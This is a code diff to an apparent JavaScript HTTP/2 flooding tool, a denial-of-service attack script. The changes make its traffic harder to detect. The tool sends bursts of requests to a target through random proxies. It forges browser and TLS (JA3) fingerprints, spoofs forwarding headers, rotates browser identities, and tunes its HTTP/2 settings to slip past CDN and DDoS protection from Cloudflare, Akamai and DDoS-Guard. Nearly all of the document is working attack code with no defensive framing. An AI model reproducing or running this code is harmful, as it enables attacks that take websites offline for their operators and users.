@@ -534,14 +534,14 @@ const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVers
     }
 
     const acceptLanguagesMap = {
-        "US": "en-US,en;q=0.9",
-        "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
-        "JP": "ja-JP,ja;q=0.9,en-US;q=0.8",
-        "DE": "de-DE,de;q=0.9,en-US;q=0.8",
-        "FR": "fr-FR,fr;q=0.9,en-US;q=0.8",
+        "US": ["en-US,en;q=0.9", "en-US,en;q=0.8,es;q=0.7", "en-US,en-GB;q=0.9", "en-US,en;q=0.8,fr;q=0.7"],
+        "VN": ["vi-VN,vi;q=0.9,en-US;q=0.8", "vi-VN,vi;q=0.9,en;q=0.7", "vi,en-US;q=0.9", "vi-VN,vi;q=0.8"],
+        "JP": ["ja-JP,ja;q=0.9,en-US;q=0.8", "ja-JP,ja;q=0.8,en;q=0.7", "ja,en-US;q=0.9"],
+        "DE": ["de-DE,de;q=0.9,en-US;q=0.8", "de-DE,de;q=0.8,en;q=0.7", "de,en-US;q=0.9"],
+        "FR": ["fr-FR,fr;q=0.9,en-US;q=0.8", "fr-FR,fr;q=0.8,en;q=0.7", "fr,en-US;q=0.9"],
     };
-    const defaultAcceptLanguage = "en-US,en;q=0.9";
-    const acceptLanguage = acceptLanguagesMap[geoCountryCode] || defaultAcceptLanguage;
+    const defaultAcceptLanguage = ["en-US,en;q=0.9", "en-US,en;q=0.8", "en,en-GB;q=0.9"];
+    const acceptLanguage = randomElement(acceptLanguagesMap[geoCountryCode] || defaultAcceptLanguage);
 
     const secFetchSite = randomElement(profile.secFetchSites);
     let referer = undefined;
@@ -555,11 +555,18 @@ const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVers
         origin = randomElement(origins);
     }
 
-    // Tạo sec-ch-ua động cho trình duyệt Chromium-based
     const chromiumBased = ["chrome", "edge", "brave", "opera", "operagx", "duckduckgo", "mobile-chrome"];
     const secChUa = chromiumBased.includes(browser) ?
         `"${browser === "chrome" || browser === "mobile-chrome" ? "Google Chrome" : browser === "edge" ? "Microsoft Edge" : browser === "brave" ? "Brave" : "Opera"}";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"` :
         undefined;
+
+    const platformVersions = {
+        "Windows": "10.0.0",
+        "macOS": "12.6.0",
+        "Linux": "5.15.0",
+        "Android": "12.0",
+        "iOS": "15.6",
+    };
 
     const headersArray = [
         [":method", "GET"],
@@ -571,6 +578,8 @@ const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVers
         ["sec-ch-ua-mobile", isMobile ? "?1" : "?0"],
         ["sec-ch-ua-platform", `"${platform}"`],
         ...(secChUa ? [["sec-ch-ua-full-version-list", `"${browser.replace("mobile-", "")}";v="${fullVersion}", "Not-A.Brand";v="99.0.0.0"`]] : []),
+        ["sec-ch-ua-platform-version", platformVersions[platform] || "10.0.0"],
+        ["sec-ch-dpr", Math.random() < 0.5 ? "1.0" : "2.0"],
         ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
         ["sec-fetch-site", secFetchSite],
         ["sec-fetch-mode", randomElement(profile.secFetchModes)],
@@ -579,9 +588,11 @@ const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVers
         ["referer", referer || "https://www.google.com/"],
         ["accept-encoding", randomElement(profile.acceptEncodings)],
         ["accept-language", acceptLanguage],
-        ["upgrade-insecure-requests", Math.random() < 0.8 ? "1" : undefined],
+        ["upgrade-insecure-requests", Math.random() < 0.9 ? "1" : undefined],
         ["cache-control", randomElement(profile.cacheControls)],
-        ["priority", Math.random() < 0.5 ? "u=0, i" : "u=1"],
+        ["priority", randomElement(["u=0, i", "u=1", "u=2", "u=3", "u=4"])],
+        ...(Math.random() < 0.5 ? [["x-request-id", `${randstr(8)}-${randstr(4)}-${randstr(4)}-${randstr(12)}`]] : []),
+        ...(Math.random() < 0.4 ? [["x-session-token", `${randstr(16)}`]] : []),
     ];
 
     const baseHeaders = headersArrayToObject(headersArray);
@@ -647,23 +658,25 @@ class SessionManager {
 
 
 function runFlooder() {
+    let sessionCounter = 0;
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
     const clength = randomElement(urihost);
 
-    const browser = getRandomBrowser();
+    let browser = getRandomBrowser();
     let browserProfile = BROWSER_PROFILES[browser];
     if (typeof browserProfile === 'string') {
         browserProfile = BROWSER_PROFILES[browserProfile];
     }
 
-    const version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
-    const platform = randomElement(browserProfile.platforms);
+    let version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
+    let platform = randomElement(browserProfile.platforms);
     const isMobile = browser.includes("mobile");
-    const fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
+    let fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
 
-    const baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
+    const isp = "Cloudflare, Inc."; // ISP cố định
+    let baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
 
     let ja3Profile = JA3_PROFILES[browser];
     if (typeof BROWSER_PROFILES[browser] === 'string') {
@@ -700,7 +713,7 @@ function runFlooder() {
             ecdhCurve: ja3Profile.ecdhCurve,
             honorCipherOrder: true,
             rejectUnauthorized: false,
-            secureProtocol: ja3Profile.secureProtocol,
+            secureProtocol: randomElement(ja3Profile.secureProtocol),
             secureOptions: secureOptions,
             host: parsedTarget.host,
             servername: parsedTarget.host,
@@ -714,7 +727,6 @@ function runFlooder() {
             secureProtocol: tlsOptions.secureProtocol
         });
         tlsOptions.secureContext = dynamicSecureContext;
-
 
         const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
 
@@ -739,73 +751,77 @@ function runFlooder() {
             const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
         });
 
-        function getSettingsBasedOnISP(isp) {
-            const defaultSettings = {
-                headerTableSize: 65536,
-                initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
-                maxHeaderListSize: 262144,
-                enablePush: false,
-                maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
-                maxFrameSize: 16384,
-                enableConnectProtocol: false,
-            };
+        function randomElement(array) {
+    return array[Math.floor(Math.random() * array.length)];
+}
 
-            const settings = { ...defaultSettings };
+function getSettingsBasedOnISP(isp) {
+    const defaultSettings = {
+        headerTableSize: 65536,
+        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
+        maxHeaderListSize: 262144,
+        enablePush: false,
+        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
+        maxFrameSize: 16384,
+        enableConnectProtocol: false,
+    };
 
-            if (isp === 'Cloudflare, Inc.') {
-                settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
-                settings.initialWindowSize = 65536;
-                settings.maxFrameSize = 16384;
-                settings.enableConnectProtocol = false;
-            } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
-                settings.headerTableSize = 4096;
-                settings.initialWindowSize = 65536;
-                settings.maxFrameSize = 16777215;
-                settings.maxConcurrentStreams = 128;
-                settings.maxHeaderListSize = 4294967295;
-            } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
-                settings.headerTableSize = 4096;
-                settings.maxConcurrentStreams = 100;
-                settings.initialWindowSize = 6291456;
-                settings.maxFrameSize = 16384;
-                settings.maxHeaderListSize = 32768;
-            } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
-                settings.headerTableSize = 4096;
-                settings.initialWindowSize = 65535;
-                settings.maxFrameSize = 16384;
-                settings.maxConcurrentStreams = 100;
-                settings.maxHeaderListSize = 4294967295;
-            } else if (isp === 'Ddos-guard LTD') {
-                settings.maxConcurrentStreams = 8;
-                settings.initialWindowSize = 65535;
-                settings.maxFrameSize = 16777215;
-                settings.maxHeaderListSize = 262144;
-            } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
-                settings.maxConcurrentStreams = 100;
-                settings.initialWindowSize = 65535;
-                settings.maxHeaderListSize = 262144;
-            } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
-                settings.headerTableSize = 4096;
-                settings.initialWindowSize = 8388608;
-                settings.maxFrameSize = 16384;
-                settings.maxConcurrentStreams = 100;
-                settings.maxHeaderListSize = 4294967295;
-            } else if (isp === 'Google LLC') {
-                settings.headerTableSize = 4096;
-                settings.initialWindowSize = 1048576;
-                settings.maxFrameSize = 16384;
-                settings.maxConcurrentStreams = 100;
-                settings.maxHeaderListSize = 137216;
-            } else {
-                settings.headerTableSize = 65535;
-                settings.maxConcurrentStreams = 1000;
-                settings.initialWindowSize = 6291456;
-                settings.maxHeaderListSize = 261144;
-                settings.maxFrameSize = 16384;
-            }
+    const settings = { ...defaultSettings };
 
-            return settings;
-        }
+    if (isp === 'Cloudflare, Inc.') {
+        settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
+        settings.initialWindowSize = 65536;
+        settings.maxFrameSize = 16384;
+        settings.enableConnectProtocol = false;
+    } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65536;
+        settings.maxFrameSize = 16777215;
+        settings.maxConcurrentStreams = 128;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
+        settings.headerTableSize = 4096;
+        settings.maxConcurrentStreams = 100;
+        settings.initialWindowSize = 6291456;
+        settings.maxFrameSize = 16384;
+        settings.maxHeaderListSize = 32768;
+    } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (isp === 'Ddos-guard LTD') {
+        settings.maxConcurrentStreams = 8;
+        settings.initialWindowSize = 65535;
+        settings.maxFrameSize = 16777215;
+        settings.maxHeaderListSize = 262144;
+    } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
+        settings.maxConcurrentStreams = 100;
+        settings.initialWindowSize = 65535;
+        settings.maxHeaderListSize = 262144;
+    } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 8388608;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 4294967295;
+    } else if (isp === 'Google LLC') {
+        settings.headerTableSize = 4096;
+        settings.initialWindowSize = 1048576;
+        settings.maxFrameSize = 16384;
+        settings.maxConcurrentStreams = 100;
+        settings.maxHeaderListSize = 137216;
+    } else {
+        settings.headerTableSize = 65535;
+        settings.maxConcurrentStreams = 1000;
+        settings.initialWindowSize = 6291456;
+        settings.maxHeaderListSize = 261144;
+        settings.maxFrameSize = 16384;
+    }
+
+    return settings;
+}
 
         let hpack = new HPACK();
         let client;
@@ -820,10 +836,9 @@ function runFlooder() {
         client.setMaxListeners(0);
 
         const updateWindow = Buffer.alloc(4);
-        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
+        updateWindow.writeUInt32BE(15663105, 0); // Giá trị cố định
         client.on('remoteSettings', (settings) => {
-            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
-            client.setLocalWindowSize(localWindowSize, 0);
+            client.setLocalWindowSize(15663105, 0); // Giá trị cố định
         });
 
         client.on('connect', () => {
@@ -834,117 +849,122 @@ function runFlooder() {
         const sessionManager = new SessionManager();
 
         clients.forEach(client => {
-    const intervalId = setInterval(() => {
-        async function sendRequests() {
-            const shuffleObject = (obj) => {
-                const keys = Object.keys(obj);
-                for (let i = keys.length - 1; i > 0; i--) {
-                    const j = Math.floor(Math.random() * (i + 1));
-                    [keys[i], keys[j]] = [keys[j], keys[i]];
-                }
-                const shuffledObj = {};
-                keys.forEach(key => shuffledObj[key] = obj[key]);
-                return shuffledObj;
-            };
+            const intervalId = setInterval(() => {
+                async function sendRequests() {
+                    const orderedResources = [
+                        { path: "/", dest: "document" },
+                        ...resourcePaths.filter(r => r.dest === "style"),
+                        ...resourcePaths.filter(r => r.dest === "script"),
+                        ...resourcePaths.filter(r => r.dest === "image"),
+                    ];
 
-            if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
-                if (Math.random() < 0.1) {
-                    await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 5000)));
-                }
-
-                for (let i = 0; i < args.Rate; i++) {
-                    const requestPromise = new Promise(async (resolve, reject) => {
-                        const resource = randomElement(resourcePaths);
-                        const selectedPath = resource.path;
-                        const secFetchDest = resource.dest;
-                        const method = Math.random() < 0.9 ? "GET" : "HEAD";
-
-                        const resourceSpecificHeaders = {
-                            "style": { "accept": "text/css,*/*;q=0.1", "sec-fetch-dest": "style" },
-                            "script": { "accept": "*/*", "sec-fetch-dest": "script" },
-                            "image": { "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8", "sec-fetch-dest": "image" },
-                        };
-
-                        const dynamicHeaders = {
-                            ...(Math.random() < 0.4 && { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` }),
-                            ...(Math.random() < 0.75 && { "referer": "https://" + clength }),
-                            ...(Math.random() < 0.75 && {
-                                "origin": Math.random() < 0.5 ?
-                                    "https://" + clength + (Math.random() < 0.5 ? ":" + randnum(4) + '/' : '@root/') :
-                                    "https://" + (Math.random() < 0.5 ? 'root-admin.' : 'root-root.') + clength
-                            }),
-                            ...(Math.random() < 0.5 && { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
-                            ...(Math.random() < 0.5 && { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) }),
-                            "RTT": "1",
-                            ...(Math.random() < 0.5 ? taoDoiTuongNgauNhien() : {}),
-                        };
-
-                        const finalHeaders = {
-                            ...baseHeaders,
-                            ":method": method,
-                            ":path": selectedPath,
-                            "sec-fetch-dest": secFetchDest,
-                            ...(resourceSpecificHeaders[secFetchDest] || {}),
-                            ...dynamicHeaders,
-                        };
-
-                        const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
-                        if (cookieHeader) {
-                            finalHeaders['cookie'] = cookieHeader;
+                    sessionCounter++;
+                    if (sessionCounter % 5 === 0) {
+                        browser = getRandomBrowser();
+                        browserProfile = BROWSER_PROFILES[browser];
+                        if (typeof browserProfile === 'string') {
+                            browserProfile = BROWSER_PROFILES[browserProfile];
                         }
+                        version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
+                        platform = randomElement(browserProfile.platforms);
+                        fullVersion = `${version}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
+                        baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);
+                    }
 
-                        const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
-                        if (cachedInfo) {
-                            if (cachedInfo.etag) {
-                                finalHeaders['if-none-match'] = cachedInfo.etag;
-                            }
-                            if (cachedInfo.lastModified) {
-                                finalHeaders['if-modified-since'] = cachedInfo.lastModified;
-                            }
+                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
+                        for (let i = 0; i < args.Rate; i++) {
+                            const requestPromise = new Promise(async (resolve, reject) => {
+                                const resource = orderedResources[i % orderedResources.length];
+                                const selectedPath = resource.path;
+                                const secFetchDest = resource.dest;
+                                const method = "GET";
+
+                                const resourceSpecificHeaders = {
+                                    "style": { "accept": "text/css,*/*;q=0.1", "sec-fetch-dest": "style" },
+                                    "script": { "accept": "*/*", "sec-fetch-dest": "script" },
+                                    "image": { "accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8", "sec-fetch-dest": "image" },
+                                };
+
+                                const dynamicHeaders = {
+                                    ...(Math.random() < 0.6 ? { 'x-forwarded-for': `${randstr(10)}:${randstr(10)}` } : {}),
+                                    ...(Math.random() < 0.9 ? { "referer": "https://" + clength } : {}),
+                                    ...(Math.random() < 0.9 ? {
+                                        "origin": Math.random() < 0.5 ?
+                                            "https://" + clength + "/" :
+                                            "https://root-admin." + clength
+                                    } : {}),
+                                    ...(Math.random() < 0.7 ? { ['cf-sec-with-from-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
+                                    ...(Math.random() < 0.7 ? { ['user-x-with-' + generateRandomString(1, 9)]: generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12) } : {}),
+                                    "RTT": randomElement(["50", "100", "150", "200"]),
+                                    ...(Math.random() < 0.7 ? taoDoiTuongNgauNhien() : {}),
+                                };
+
+                                const finalHeaders = {
+                                    ...baseHeaders,
+                                    ":method": method,
+                                    ":path": selectedPath,
+                                    "sec-fetch-dest": secFetchDest,
+                                    ...(resourceSpecificHeaders[secFetchDest] || {}),
+                                    ...dynamicHeaders,
+                                };
+
+                                const cookieHeader = sessionManager.getCookieHeader(parsedTarget.host);
+                                if (cookieHeader) {
+                                    finalHeaders['cookie'] = cookieHeader;
+                                }
+
+                                const cachedInfo = sessionManager.getCacheHeaders(selectedPath);
+                                if (cachedInfo) {
+                                    if (cachedInfo.etag) {
+                                        finalHeaders['if-none-match'] = cachedInfo.etag;
+                                    }
+                                    if (cachedInfo.lastModified) {
+                                        finalHeaders['if-modified-since'] = cachedInfo.lastModified;
+                                    }
+                                }
+
+                                Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);
+
+                                const req = client.request(finalHeaders, {
+                                    weight: randomElement([200, 231, 251]),
+                                    depends_on: 0,
+                                    exclusive: Math.random() < 0.5 ? true : false,
+                                })
+                                .on('response', response => {
+                                    const setCookie = response['set-cookie'];
+                                    if (setCookie) {
+                                        sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
+                                    }
+
+                                    const etag = response['etag'];
+                                    const lastModified = response['last-modified'];
+                                    if (etag || lastModified) {
+                                        sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
+                                    }
+
+                                    req.close(http2.constants.NO_ERROR);
+                                    req.destroy();
+                                    resolve();
+                                })
+                                .on('error', (err) => {
+                                    reject(err);
+                                });
+
+                                req.on('end', () => {
+                                    resolve();
+                                });
+
+                                req.end();
+                                await new Promise(resolve => setTimeout(resolve, 500 + (Math.random() * 100 - 50))); // Độ trễ 450-550ms
+                            });
+                            await requestPromise.catch(() => {});
                         }
-
-                        Object.keys(finalHeaders).forEach(key => finalHeaders[key] === undefined && delete finalHeaders[key]);
-
-                        const req = client.request(finalHeaders, {
-                            weight: Math.random() < 0.5 ? 251 : 231,
-                            depends_on: 0,
-                            exclusive: Math.random() < 0.5 ? true : false,
-                        })
-                        .on('response', response => {
-                            const setCookie = response['set-cookie'];
-                            if (setCookie) {
-                                sessionManager.addCookies(parsedTarget.host, Array.isArray(setCookie) ? setCookie : [setCookie]);
-                            }
-
-                            const etag = response['etag'];
-                            const lastModified = response['last-modified'];
-                            if (etag || lastModified) {
-                                sessionManager.addCacheHeaders(selectedPath, etag, lastModified);
-                            }
-
-                            req.close(http2.constants.NO_ERROR);
-                            req.destroy();
-                            resolve();
-                        })
-                        .on('error', (err) => {
-                            reject(err);
-                        });
-
-                        req.on('end', () => {
-                            resolve();
-                        });
-
-                        req.end();
-                        await new Promise(resolve => setTimeout(resolve, getRandomInt(50, 500)));
-                    });
-                    await requestPromise.catch(() => {});
+                    }
                 }
-            }
-        }
 
-        sendRequests();
-    }, getRandomInt(500, 2000));
-});
+                sendRequests();
+            }, 500); // Độ trễ cố định 500ms
+        });
 
         client.on("close", () => {
             client.destroy();
